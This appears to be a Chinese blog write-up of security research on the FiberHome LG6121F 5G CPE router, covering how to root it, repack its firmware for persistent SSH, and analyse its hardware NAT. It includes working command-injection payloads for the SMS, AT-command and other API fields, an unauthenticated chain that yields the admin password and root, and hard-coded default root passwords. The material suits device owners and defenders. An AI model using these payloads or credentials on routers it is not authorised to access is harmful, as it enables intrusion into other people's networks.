---
title: "烽火 LG6121F 5G CPE 安全研究"
date: 2026-04-12T20:00:00+08:00
tags: ["逆向工程", "网络协议", "数码产品"]
keywords: ["烽火", "FiberHome", "LG6121F", "5G CPE", "OpenWrt", "命令注入", "固件修改", "SSH", "MT6890", "硬件NAT", "overlayfs", "dropbear", "烽火CPE刷机", "烽火CPE获取root", "烽火CPE安装OpenWrt"]
description: "烽火 LG6121F 5G CPE 获取 root 权限与固件修改全记录。通过短信注入、AT 命令注入等多种方式获取 root shell，逆向 Web API 发现未认证接口可直接读取管理员密码，修改固件激活 OpenWrt overlayfs 实现 SSH 持久化自启动，以及 hw_nat 硬件加速机制的逆向分析。适用于希望对烽火 CPE 进行深度定制、刷机或安装 OpenWrt 插件的用户参考。"
draft: false
---


两年前买了一台 LG6121F 5G CPE，使用了大概半年左右，就一直放着吃灰，最近翻出来，想看看能不能获取 root 权限、跑一些自定义服务。折腾了一段时间，在 Web API 里发现了不少安全问题，也成功实现了固件修改和 SSH 持久化。这篇文章把整个研究过程记录下来。

先看看设备的基本规格，详细的拆机测评可以看 [Acwifi](https://www.acwifi.net/17162.html) 的文章：

- **型号**：FiberHome LG6121F
- **SoC**：MediaTek MT6890 (T750)，ARMv8 Cortex-A55 四核
- **内存**：1GB
- **存储**：NAND Flash，UBI 分区
- **5G 模块**：Quectel RG500L
- **系统**：OpenWrt 19.07.7，Linux 4.19.190，musl libc 1.1.24

![图源 Acwifi](https://static.codming.com/img/20260413174656280.jpg)

5G 信号表现还不错，我这边的基线数据（电信卡）：

- **模式**：5G SA（独立组网），N78 频段 (3.5GHz)，带宽 100 MHz
- **信号质量**：RSRP -77 ~ -81 dBm，SINR 16 dB，2×2 MIMO

我这张电信卡限制下行 500 Mbps，上行 100 Mbps，实际测试最高能到 300-400 Mbps / 100 Mbps 左右，基站会在晚高峰动态限速，下行大概可以跑到 200 - 300 Mbps。

*以下分析均基于 R108 版本，不同版本 API 和漏洞可能有所不同，具体以实际设备为准。*

### Web API

烽火 CPE 提供一个 Web 页面管理设备，架构是：

```
浏览器/APP → Nginx (:80/:443) → FastCGI webs (:8840)
```

前端请求由 Nginx 接收，转发给后端的 `/fhrom/bin/webs` 进程处理。`webs` 通过 FastCGI 协议通信，以 root 权限运行。

设备提供了四类 API 端点，后面获取 Shell 的时候会频繁用到：

| 端点路径 | 认证 | 加密 | 说明 |
|---------|------|------|------|
| `/api/tmp/FHAPIS` | 需要 superadmin 登录 | AES-CBC | 主要管理接口 |
| `/api/tmp/FHNCAPIS` | **无需认证** | AES-CBC | 含敏感读写 |
| `/api/tmp/FHTOOLAPIS` | APP 级登录 | **明文** | 主要供手机 APP 使用 |
| CGI 接口 | 部分需要登录 | 无 | Telnet/ADB 开关等 |


AES 加密方式如下：

```
key = sessionid 前 16 字节
IV  = 固定值 bytes([112, 113, ..., 127])，HEX 70717273...7e7f
模式: AES-128-CBC，PKCS7 填充，HEX 编码
```

而 sessionid 可以通过一个无需认证的 GET 请求获取：

```shell
GET /api/tmp/FHNCAPIS?ajaxmethod=get_refresh_sessionid
→ {"sessionid": "xxxxxxxxxxxxxxxx..."}
```

后面涉及 API 调用时，统一用简化的伪代码表示。实际调用流程如下：

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

IV = bytes([i + 112 for i in range(16)])

def encrypt(plaintext: str, key: bytes) -> str:
    cipher = AES.new(key, AES.MODE_CBC, IV)
    return cipher.encrypt(pad(plaintext.encode(), AES.block_size)).hex()

def decrypt(hex_str: str, key: bytes) -> str:
    cipher = AES.new(key, AES.MODE_CBC, IV)
    return unpad(cipher.decrypt(bytes.fromhex(hex_str)), AES.block_size).decode()

# 1. 获取 sessionid，派生 AES key
sid = GET('/api/tmp/FHNCAPIS?ajaxmethod=get_refresh_sessionid')['sessionid']
key = sid[:16].encode()

# 2. 登录（请求体 JSON 加密后 POST，响应同样需要解密）
POST('/api/sign/DO_WEB_LOGIN', encrypt(json.dumps({
    'dataObj': {'username': 'superadmin', 'password': '<密码>'},
    'ajaxmethod': 'DO_WEB_LOGIN',
    'sessionid': sid,
}), key))

# 3. 调用接口
resp = decrypt(POST('/api/tmp/FHAPIS', encrypt(json.dumps({
    'dataObj': {'command': 'AT'},
    'ajaxmethod': 'set_at_command',
    'sessionid': sid,
}), key)), key)
```


## 获取 Shell 访问

研究过程中找到了好几种获取 Shell 的方法，按操作便捷程度排序。

### 短信页面注入命令

这是最容易操作的方式，直接在设备的 Web 管理页面发短信就行。

设备的短信发送功能使用 `send_msg` 接口，后端会把参数拼接成 shell 命令执行：

```shell
mn_send_pdu '%s'    '%s'    "%s"
//           ↑       ↑       ↑
//      recv_number encode content
```

其中 `content` 字段用双引号包裹。前端虽然做了转义，但直接调用 API 可以绕过。更简单的是，反引号 `` ` `` 在前端没有被转义，可以在 Web 页面的短信输入框中使用。

在页面新建短信，收件人填一个正常号码（比如 `10000`），短信内容填：

```
test`dropbear -p 22`
```

点击发送后，短信会正常发出去，同时反引号中的命令会以 root 权限在后台执行，实际生成的 shell 命令是：

```shell
mn_send_pdu '10000' 'GSM_8BIT' "test`dropbear -p 22`"
```
*原理：shell 在解析双引号字符串时，会先对反引号 `` ` `` 包裹的内容进行命令替换（Command Substitution），即先执行 `dropbear -p 22`，再把输出（这个命令输出为空）拼回原字符串，dropbear SSH 服务就这样被启动了。*

接着再发一条短信放行防火墙：

```
test`iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT`
```

现在就可以 SSH 登录了，设备 `/etc/shadow` 中 root 的默认密码是 `F1ber@dm!n`：

```shell
ssh root@192.168.8.1
# 密码: F1ber@dm!n
```

![短信发送注入](https://static.codming.com/img/20260413174656281.png)

如果通过 API 直接调用，注入方式更灵活，`content` 字段可以用双引号闭合：

```javascript
// API 调用示例（需先登录获取 session）
$post("send_msg", {
    recv_number: "10000",
    encode_schema: "GSM_8BIT",
    content: 'hello";dropbear -p 22;echo "'
})
// 生成: mn_send_pdu '10000' 'GSM_8BIT' "hello";dropbear -p 22;echo ""
```

`recv_number` 字段同样可以注入（单引号闭合）：

```javascript
$post("send_msg", {
    recv_number: "';dropbear -p 22;echo '",
    encode_schema: "GSM_8BIT",
    content: "test"
})
```

三个参数都没有做服务端过滤，注入非常自由。

### AT 指令注入

`set_at_command` 接口用于向 5G 模块发送 AT 命令，后端实现是：

```c
snprintf(cmd, 0x100, "mipc_wan_cli --at_cmd %s", user_input);
popen(cmd, "r");  // root 权限执行，stdout 会返回给前端
```

过滤了 `&`、`;` 和 `reboot` 关键字，但是没有过滤管道符 `|`、`$()`、反引号等。利用方式：

```
命令: AT|id
实际执行: mipc_wan_cli --at_cmd AT | id
```

`AT` 是一个空的 AT 命令（模块会回复 OK），管道符 `|` 把两个进程分开，右边的命令独立执行。而且 stdout 会被捕获并返回，所以可以看到命令输出。

这个接口走 FHAPIS 端点，需要 superadmin 登录：

```shell
POST /api/tmp/FHAPIS  ajaxmethod=set_at_command
{'command': 'AT|id'}
# → {"at_result": "uid=0(root) gid=0(root)\n"}
```

用这个方法启动 SSH，分两步：

```shell
POST /api/tmp/FHAPIS  ajaxmethod=set_at_command
{'command': 'AT|dropbear -p 22'}

POST /api/tmp/FHAPIS  ajaxmethod=set_at_command
{'command': 'AT|iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT'}
```

### ADB 方式

登录 Web 管理页面后，访问 `http://192.168.8.1/cgi-bin/adbdebug?enable=1` 开启 ADB，页面显示 `adb/at open`

然后用 Micro USB 线连接设备和电脑。注意需要**支持数据传输**的线材，很多小家电自带的线只能充电。连接后先确认设备是否识别：

```shell
adb devices
# 应该能看到设备列表中出现一条记录

# 开启 SSH
adb shell "dropbear -p 22; iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT"
```

### Telnet：间接方式

Telnet 是一个相对传统的路径，需要多走几步。先访问 CGI 接口开启：

```shell
curl 'http://192.168.8.1/cgi-bin/fh_telnet?enable=1&key=<key>'
# key 的计算方式：设备 bridge MAC 地址后 6 位（十六进制）加 1。
# 比如 MAC 是 `A1:B2:C3:D4:E5:F6`，后 6 位是 `D4E5F6`，加 1 得到 `D4E5F7`

telnet 192.168.8.1
# 用户名: admin
# 默认密码: hg2x0 + MAC 后6位，例如 hg2x0D4E5F6

su root
# 默认密码: f1ber@dm!n + MAC 后6位，例如 f1ber@dm!nD4E5F6

dropbear -p 22
iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT
```

### 不知道管理员密码时

前面几种方法（除了 ADB）都需要知道 Web 管理员密码或者 MAC 地址。如果你啥都不知道，只是连上了这个设备的 WiFi 呢？

`FHNCAPIS` 端点是**完全不需要认证**的，而且它能读写 TR-069 参数，包括超级管理员的明文密码。

**完整攻击链，只需 4 个 HTTP 请求：**

```shell
# 1. 获取 sessionid（无需认证）
GET /api/tmp/FHNCAPIS?ajaxmethod=get_refresh_sessionid
# → {"sessionid": "abc123..."}

# 2. 读取超管密码（无需认证，AES 加密）
POST /api/tmp/FHNCAPIS  ajaxmethod=get_value_by_xmlnode
{'InternetGatewayDevice.X_FH_WebUserInfo.2.WebSuperPassword': ''}
# → {"WebSuperPassword": "F1ber$dm"}

# 3. 用获取到的密码登录
POST /api/sign/DO_WEB_LOGIN
{'username': 'superadmin', 'password': 'F1ber$dm'}

# 4. AT 命令注入，执行任意命令
POST /api/tmp/FHAPIS  ajaxmethod=set_at_command
{'command': 'AT|id'}
# → {"at_result": "uid=0(root) gid=0(root)\n"}
```

也就是说，任何能连上设备网络的人，4 个请求就能拿到 root RCE。甚至不需要读取密码，直接重置也行：

```shell
POST /api/tmp/FHNCAPIS  ajaxmethod=set_value_by_xmlnode
{'InternetGatewayDevice.X_FH_WebUserInfo.2.WebSuperPassword': 'mypassword'}
```

这个漏洞是 `FHNCAPIS` 端点设计时就没有加认证，而 AES 加密的密钥又是公开可获取的，权限管理形同虚设。

到这里我们已经能通过多种方式临时获取 root shell 了，不过这些都是一次性的，重启之后 dropbear 进程和防火墙规则都会丢失。接下来想办法实现持久化。

## 自启动方式排查

第一反应是找一个可写的地方塞个启动脚本，但系统性排查后发现，几乎全部行不通：

| 方式 | 结果 | 原因 |
|------|------|------|
| SshEnable 参数 | ❌ | 死参数，无进程消费 |
| process_start_list | ❌ | 路径硬编码为 `/fhrom/fhconf/`，只读 |
| nginx.conf 注入 | ❌ | 每次启动被 start_webserver.sh 覆盖 |
| crond 定时任务 | ❌ | crontab 目录为空且不可写入 |
| init 脚本 | ❌ | 全在 squashfs 只读分区 |
| hotplug 脚本 | ❌ | 依赖项都在只读目录 |
| rc.local（无 overlay） | ❌ | `/etc` 只读，无法写入 |
| uci-defaults | ❌ | 目录在 squashfs，无法添加脚本 |
| UCI triggers | ❌ | 只在 `uci commit` 时触发，启动时不触发 |
| PATH 劫持 | ❌ | PATH 中所有目录都在 squashfs |
| preinit 脚本链 | ❌ | 16 个脚本全在只读分区 |
| 定时重启功能注入 | ❌ | 纯整数比较，无法注入 |

核心问题在于：根文件系统是 squashfs 只读的，几乎所有启动脚本和配置路径都在只读分区上。唯一的出路是激活 OpenWrt 的 overlayfs 机制，让 `/etc` 变成可写的。但这需要修改固件，先来深入了解一下系统结构。

## 深入系统

### 密码体系

设备有好几层密码，规则各不相同：

| 用途 | 默认密码 | 说明 |
|------|---------|------|
| Web admin | 写在设备底部铭牌上 | |
| Web superadmin | `F1ber$dm​` | RP0107+ 版本 |
| Telnet admin | `hg2x0` + MAC 后 6 位 | 例如 `hg2x0D4E5F6` |
| su root | `f1ber@dm!n` + MAC 后 6 位 | MD5 crypt 验证 |
| /etc/shadow root | `F1ber@dm!n` | SHA-512，固件内固定 |
| FTP | `admin` / `f1ber@dm!n` | 工厂模式可用 |

### A/B 双分区机制

设备采用了 A/B 分区设计，用于安全 OTA 升级：写入新固件到非活动槽位，切换后启动，无法启动时自动回退到旧槽位。

Bootctrl 数据位于 misc 分区（mtd3）偏移 0x800 处，共 16 字节：

```
偏移  内容
+0    magic: 0x00414230 ("AB0")
+4    padding: 0xFFFFFFFF
+8    priority_a (高值优先启动)
+9    try_a (重试计数)
+10   success_a (0x01 = 确认成功)
+11   up_a (升级类型)
+12~15  priority_b, try_b, success_b, up_b
```

Bootloader 选择 priority 值更高的槽位启动。

### 分区表

设备的 NAND Flash 划分了大量分区，A/B 槽位各有一份完整的系统分区：

| 分区 | Slot A MTD | Slot B MTD | 大小 | 说明 |
|------|-----------|-----------|------|------|
| lk (bootloader) | 25 | 38 | 2 MB | Little Kernel |
| boot (内核) | 27 | 40 | 32 MB | Linux 内核 |
| rootfs_sig | 28 | 41 | 1 MB | 固件签名 |
| rootfs | 29 | 42 | 64 MB | 根文件系统 |
| md1img (5G 固件) | 17 | 30 | 80 MB | 5G modem 固件 |
| md1dsp | 18 | 31 | 10 MB | 5G DSP |

共享分区（不分 A/B）：

| 分区 | MTD | 大小 | 说明 |
|------|-----|------|------|
| misc | 3 | 1 MB | bootctrl 数据 |
| user_data | 48 | 441 MB | 用户数据 /data |

### 文件系统布局

| 挂载点 | 类型 | 权限 | 用途 |
|--------|------|------|------|
| `/` | squashfs | 只读 | 根文件系统 |
| `/tmp` | tmpfs | 读写 | 临时文件，重启清空 |
| `/data` | ubifs | 读写 | 持久用户数据 |
| `/fhdata` | ubifs | 只读 | 出厂配置 |
| `/customer` | ubifs | 读写 | UCI 配置文件 |
| `/fhrom` | squashfs | 只读 | 烽火自定义二进制文件 |

关键信息：根文件系统是 squashfs 只读的，`/etc` 下的文件不能直接修改。可写的位置只有 `/tmp`（重启丢失）、`/data`（持久）和 `/customer`，要实现 SSH 服务自启动，必须修改固件激活 overlayfs。

## 解锁与固件修改

**提醒：以下操作存在风险，可能导致设备变砖，请务必做好备份，并确保有物理访问权限以便恢复。**

### MTD 写保护解锁

烽火在驱动层面加了写保护，直接写 NAND 分区会被内核拒绝，在网页端，有个本地升级功能，通过逆向 `webs` 的固件升级流程，追踪到了解锁的调用链：

```
webs (do_version_up)
  → libLedState.so (bsp_write_handler)
    → libfhdrv_kdrv_board.so (fhdrv_kdrv_update_flash_opt)
      → ioctl(fd, 0x40085318, {mtd_num, 0})  // 解锁
```

烽火通过 `/dev/fhdrv_kdrv_board` 字符设备（主设备号 506）的自定义 ioctl 来控制 MTD 写保护。写了一个小工具来调用它：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define DEVICE_PATH "/dev/fhdrv_kdrv_board"
#define IOCTL_FLASH_SET 0x40085318

struct flash_opt {
    int mtd_num;
    int lock_flag;  /* 0 = unlock, 1 = lock */
};

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <mtd_num> [lock]\n", argv[0]);
        fprintf(stderr, "  %s 29       - unlock mtd29\n", argv[0]);
        fprintf(stderr, "  %s 29 lock  - lock mtd29\n", argv[0]);
        return 1;
    }

    int mtd_num = atoi(argv[1]);
    int lock_flag = 0;  /* default: unlock */
    if (argc >= 3 && strcmp(argv[2], "lock") == 0)
        lock_flag = 1;

    int fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0) {
        perror("open " DEVICE_PATH);
        return 1;
    }

    struct flash_opt opt = { mtd_num, lock_flag };
    int ret = ioctl(fd, IOCTL_FLASH_SET, &opt);
    if (ret < 0) {
        perror("ioctl FLASH_SET");
        close(fd);
        return 1;
    }

    printf("mtd%d %s OK\n", mtd_num, lock_flag ? "locked" : "unlocked");
    close(fd);
    return 0;
}
```

交叉编译后传到设备上：

```shell
aarch64-linux-musl-gcc -static -o mtd_unlock mtd_unlock.c
scp mtd_unlock root@192.168.8.1:/data/
```

使用方式：

```shell
/data/mtd_unlock 29         # 解锁 rootfs_a
/data/mtd_unlock 29 lock    # 重新锁定
```

### 固件修改实战

目标是让设备启动时自动激活 overlayfs，这样 `/etc` 就变成可写的了，改了什么东西都能持久保存。

OpenWrt 本身有完整的 overlay 机制，但烽火在 `/lib/preinit/80_mount_root` 中把 `mount_root` 调用注释掉了：

```shell
#!/bin/sh
# Copyright (C) 2006 OpenWrt.org
# Copyright (C) 2010 Vertical Communications

do_mount_root() {
        #mount_root        # ← 烽火注释了这一行
        boot_run_hook preinit_mount_root
        [ -f /sysupgrade.tgz ] && {
                echo "- config restore -"
                cd /
                tar xzf /sysupgrade.tgz
        }
}

[ "$INITRAMFS" = "1" ] || boot_hook_add preinit_main do_mount_root
```

只需要把注释去掉，overlay 就能工作了。完整流程：

**第一步：导出当前 rootfs**

```shell
# 在 CPE 设备上
nanddump --skip-bad-blocks-to-start /dev/mtd/rootfs -f /data/rootfs_dump.squashfs

# 传到电脑
scp root@192.168.8.1:/data/rootfs_dump.squashfs ./
```

**第二步：解包、修改、重打包**

```shell
# 提取 UBI 镜像中的 squashfs
ubireader_extract_images rootfs_dump.squashfs -o ubi_extract/

# 解压 squashfs
unsquashfs -f -d squashfs-root ubi_extract/rootfs_dump.squashfs/img-*_vol-rootfs.ubifs

# 关键修改：去掉 mount_root 前的注释符
# 编辑 squashfs-root/lib/preinit/80_mount_root
# 将 "#mount_root" 改为 "mount_root"

# 重新打包（参数必须和原始一致）
mksquashfs squashfs-root rootfs_modified.squashfs \
    -comp xz -b 262144 -no-xattrs -noappend -all-root
```

**第三步：同步 A/B 分区**

写 rootfs 之前，务必先把当前活动槽位的所有分区同步到目标槽位，否则内核/modem 版本不匹配会导致 5G 异常：

```shell
# 示例：将 slot B 同步到 slot A
for pair in \
    "27 40 boot" "25 38 lk" "17 30 md1img" "18 31 md1dsp" \
    "28 41 rootfs_sig" "19 32 spmfw" "20 33 pi_img" \
    "21 34 dpm" "22 35 medmcu" "23 36 sspm" "24 37 mcupm" \
    "26 39 tee" "10 12 mcf1" "11 13 mcf2" "43 44 loader_ext"; do
    set -- $pair; DST=$1; SRC=$2; NAME=$3
    echo "=== $NAME: mtd$SRC → mtd$DST ==="
    nanddump --skip-bad-blocks-to-start /dev/mtd$SRC -f /tmp/part.bin 2>/dev/null
    /data/mtd_unlock $DST
    flash_erase /dev/mtd$DST 0 0
    nandwrite -p /dev/mtd$DST /tmp/part.bin
    /data/mtd_unlock $DST lock
    rm /tmp/part.bin
done
```

**第四步：写入修改后的 rootfs**

```shell
scp rootfs_modified.squashfs root@192.168.8.1:/tmp/

# 在 CPE 设备上
/data/mtd_unlock 29                              # 解锁 rootfs_a
ubiattach -p /dev/mtd29 -d 2                    # 挂载为 ubi2
```

写入前先检查卷大小是否够用。不同固件版本的 rootfs UBI 卷大小可能不同（如 153 LEBs vs 154 LEBs），如果新的 squashfs 比卷大，需要先调整：

```shell
# 查看当前卷大小
ubinfo /dev/ubi2_0
# 输出中关注 "Size" 字段，例如 "Size: 153 LEBs (xxxxx bytes)"

# 查看新 squashfs 大小
ls -l /tmp/rootfs_modified.squashfs

# 如果卷空间不够，缩小 rootfs_data（卷 1）腾出空间给 rootfs（卷 0）
# UBI 总空间 = rootfs + rootfs_data，两个卷共享同一个 UBI 设备
# 例如需要将 rootfs 从 153 LEBs 扩到 155 LEBs：
ubirsvol /dev/ubi2 -n 1 -s 18MiB    # 先缩小 rootfs_data
ubirsvol /dev/ubi2 -n 0 -s 40MiB    # 再扩大 rootfs

# 写入
ubiupdatevol /dev/ubi2_0 /tmp/rootfs_modified.squashfs

# 断开并锁定
ubidetach -d 2
/data/mtd_unlock 29 lock
```

**第五步：切换启动槽位并重启**

```shell
. /lib/functions.sh; . /lib/functions/system.sh; include /lib/upgrade
FLASH_TYPE=$(get_flash_type)

/data/mtd_unlock 3
# 设置 A 槽优先级高于 B 槽
set_bootctrl_string 1 0f 0 00 1 01 0 00 1 0e 0 00 1 01 0 00
/data/mtd_unlock 3 lock
reboot
```

**当前状态：**
- Slot A：修改后的固件（overlay 激活，SSH 自启动）← 日常使用
- Slot B：原始固件 ← 紧急回退

### 服务自启动

Overlay 激活后 `/etc` 变成可写的了，现在可以配置 SSH 自启动了。首次启动修改后的固件后执行一次：

```shell
# 1. 重启后 overlay 已激活，但 SSH 还没自启动，需要使用前面的方法临时开启 SSH，再登录设备：
ssh root@192.168.8.1   # 密码: F1ber@dm!n

# 2. 修改 root 密码
passwd root

# 3. 启用 dropbear 自启动（overlay 下 /etc 可写，持久生效）
/etc/init.d/dropbear enable

# 4. 配置防火墙持久化
cat > /etc/rc.local << 'EOF'
iptables -C INPUT -p tcp --dport 22 -j ACCEPT 2>/dev/null || \
    iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT
exit 0
EOF

# 5. 检查 /etc/rc.local 内容
cat /etc/rc.local
```

还有一个小坑：原始的 `S99zmtk_boot_done` 脚本在更新 bootctrl 时没有先解锁 MTD，导致写入静默失败。需要在 overlay 里打个补丁，在 `set_bootctrl_string` 前后加上 `/data/mtd_unlock 3` 和 `/data/mtd_unlock 3 lock`。

### 启用 LuCI Web 界面

设备固件基于 OpenWrt 19.07.7，LuCI 框架及依赖已预装在 squashfs 中，但烽火移除了 uhttpd 二进制。补回 uhttpd 后可以在独立端口运行 LuCI，和原厂 Web 界面并行使用。

| 组件 | 状态 |
|------|------|
| LuCI 框架 `/usr/lib/lua/luci/` | ✅ 已预装 |
| LuCI CGI 入口 `/www/cgi-bin/luci` | ✅ 已存在 |
| rpcd `/sbin/rpcd` | ✅ 已运行 |
| uhttpd 配置和 init 脚本 | ✅ 已存在 |
| **uhttpd 二进制** `/usr/sbin/uhttpd` | ❌ 被移除 |
| **uhttpd_lua.so** | ❌ 被移除 |
| **uhttpd_ubus.so** | ❌ 被移除 |

只需补回三个被移除的文件即可。设备上的 opkg 已损坏（Segfault），需要在电脑上下载 ipk 包手动解包：

```shell
# 在电脑上下载三个包（aarch64_cortex-a53 与设备的 a55 二进制兼容）
curl -L -O https://downloads.openwrt.org/releases/19.07.7/packages/aarch64_cortex-a53/base/uhttpd_2020-10-01-3abcc891-1_aarch64_cortex-a53.ipk
curl -L -O https://downloads.openwrt.org/releases/19.07.7/packages/aarch64_cortex-a53/base/uhttpd-mod-lua_2020-10-01-3abcc891-1_aarch64_cortex-a53.ipk
curl -L -O https://downloads.openwrt.org/releases/19.07.7/packages/aarch64_cortex-a53/base/uhttpd-mod-ubus_2020-10-01-3abcc891-1_aarch64_cortex-a53.ipk

# ipk 格式是 gzipped tar，内含 data.tar.gz
# 以 uhttpd 为例：
mkdir -p /tmp/uhttpd_extract && cd /tmp/uhttpd_extract
cp uhttpd_*.ipk ./uhttpd.tar.gz
tar xzf uhttpd.tar.gz && tar xzf data.tar.gz
# 得到 ./usr/sbin/uhttpd
# 其余两个包同理，分别得到 uhttpd_lua.so 和 uhttpd_ubus.so
```

部署到设备：

```shell
scp uhttpd root@192.168.8.1:/usr/sbin/uhttpd
scp uhttpd_lua.so root@192.168.8.1:/usr/lib/uhttpd_lua.so
scp uhttpd_ubus.so root@192.168.8.1:/usr/lib/uhttpd_ubus.so
ssh root@192.168.8.1 'chmod +x /usr/sbin/uhttpd'
```

配置 uhttpd 在 9080 端口运行，避免与原厂 nginx 冲突：

```shell
uci set uhttpd.main.listen_http='0.0.0.0:9080'
uci delete uhttpd.main.listen_https
uci set uhttpd.main.redirect_https='0'
uci commit uhttpd

# 放行防火墙并启动
iptables -I INPUT 1 -i br0 -p tcp --dport 9080 -j ACCEPT
/etc/init.d/uhttpd start
```

浏览器访问 `http://192.168.8.1:9080/cgi-bin/luci`，使用 root 账户登录（密码为 `passwd` 设置的密码）。

**注意**：烽火的网络配置（br0 桥接、ccmni2 路由、自定义防火墙链）是非标准的，在 LuCI 中修改网络或防火墙配置可能导致断网。建议只用 LuCI 查看系统状态（Status 页面），不要保存或应用网络/防火墙配置。


## 硬件与网络问题

在使用过程中发现了一个奇怪的现象：从 LAN 设备经过 CPE 转发的流量（FORWARD）能跑到 100Mbps 以上，但从 CPE 本机发出的流量（OUTPUT）只有不到 10Mbps。差了 10 倍，尝试寻找原因，但本人对于网络驱动的理解有限，欢迎指正。

### hw_nat 硬件加速逆向

通过逆向 `hw_nat.ko`（306KB，MediaTek PPE/FOE 硬件加速模块），发现不同路径的流量处理方式完全不同：

**FORWARD 路径（快速，~100Mbps）：**

```
LAN 设备 → ETH 网卡接收 → PPE 硬件标记数据包
  → Linux FORWARD 链路由 → PPE 识别到标记 → 绑定硬件流表
  → 后续包直接由 PPE 硬件转发（绕过 Linux 协议栈）
```

**OUTPUT 路径（慢速，~10Mbps）：**

```
本机 socket 写入 → 数据包从未经过 PPE RX
  → 到达 ccmni TX 时，PPE 检查发现没有标记
  → 跳过硬件加速 → 走 DPMAIF 软件路径
  → Modem 固件处理，~200 pkt/s/flow
```

核心代码（IDA 逆向 `tx_cpu_handler_modem`）：

```c
v8 = *(_BYTE *)(foe_cb + 2) & 0x7C;  // 读取 CPU reason
if (v8 != 60) {                       // 60 = HIT_BIND_FORCE_TO_CPU
    return 1;                         // 没有 PPE 标记，跳过加速
}
// 只有 PPE 标记过的 FORWARD 数据包才会到这里
```

PPE 物理上位于 MAC 和 CPU 之间，只能加速从物理接口进入的流量。本机发出的包直接从 socket 层出去，绕过了 PPE 的 RX 侧，因此永远不会被标记和加速。

### 优化尝试

前后尝试了 22 种优化方案，全部无效：

- TUN 设备、iptables REDIRECT、TCP 缓冲区调优、Go runtime GOMAXPROCS 调整
- fq_codel/SQM QoS、veth + network namespace、GSO/SG offload
- TCP pacing、BQL、tcp_limit_output_bytes、initcwnd 调整
- BBR 拥塞算法（内核未编译）、MSS clamping、策略路由……

MTU 实验进一步确认了瓶颈在 pkt/s 而非 byte/s：

```
MTU 1500 → ~2 Mbps/flow
MTU 500  → ~0.4 Mbps/flow  （比例下降）
```

零丢包、零重传也排除了网络拥塞的可能，看起来这确实是 Modem 固件 DPMAIF 软件路径的 pkt/s 硬限制，如果有读者对这个模块更熟悉，欢迎联系我进一步分析。


## 其他发现的漏洞

除了前面详细介绍的几个用于获取 Shell 的漏洞，研究过程中还发现了其他安全问题：

| 漏洞 | 类型 | 端点 | 注入参数 |
|------|------|------|---------|
| FHNCAPIS 未认证读写 | 认证缺失 | `/api/tmp/FHNCAPIS` | - |
| AT 命令注入 | 命令注入 | FHAPIS `set_at_command` | `command` |
| 短信发送注入 | 命令注入 | FHAPIS `send_msg` | `recv_number` / `content` |
| 短信会话删除注入 | 命令注入 | FHAPIS `sms_del_session` | `del_phone` |
| 流量校准注入 | 命令注入 | FHAPIS `traffic_clear_calibration` | `calibrationVal` |
| SIM PIN 注入 | 命令注入 | FHAPIS `set_pin_code_info` | `PINCode` / `PUKCode` 等 4 个 |
| 文件上传路径穿越 | 任意文件写入 | FHAPIS `do_upgrade` (fileupload) | `path` + `filename` |

有几个我没有实际测试，仅从代码分析来看存在注入风险：

**短信会话删除注入（sms_del_session）：**

```json
{
    "ajaxmethod": "sms_del_session",
    "del_phone": "\";id > /tmp/pwned;echo \""
}
```

后端拼接：`ubus call mobile_network get_session_by_phone '{"phone":"%s"}'`，双引号闭合注入。

**流量校准注入（traffic_clear_calibration）：**

```javascript
$post("traffic_clear_calibration", {
    action: "calibration",
    calibrationVal: '";id>/tmp/pwned;echo "'
})
```

**SIM PIN 注入（set_pin_code_info）：**

4 个参数（`PINCode`、`PUKCode`、`OldPINCode`、`PINLockEnable`）都可注入。不过这个漏洞小心测试，错误的 PIN 码会导致 SIM 卡被锁定，必须使用 PUK 码解锁。

**文件上传 + 路径穿越（do_upgrade fileupload）：**

```
path=/tmp, filename=../../data/autostart.sh
→ 实际写入 /data/autostart.sh
```

后端只检查目录是否存在且可写，不过滤路径穿越字符。而且在判断是否为符号链接时，还有一个 `rm` 命令注入：

```c
snprintf(cmd, 0x201, "rm %s > /dev/null 2>&1", full_path);
do_cmd(cmd);  // filename 中的 ; 会被执行
```

## 参考资料 & 工具

- [OpenWrt 19.07 文档](https://openwrt.org/releases/19.07/start)
- [MediaTek MT6890 (Dimensity 720) 规格](https://www.mediatek.com/products/5g-broadband/mediatek-t750)
- [Quectel RG500L 模块](https://www.quectel.com/product/5g-rg500l)
- [ubi_reader - UBI 镜像工具](https://github.com/onekey-sec/ubi_reader)
- [squashfs-tools](https://github.com/plougher/squashfs-tools)
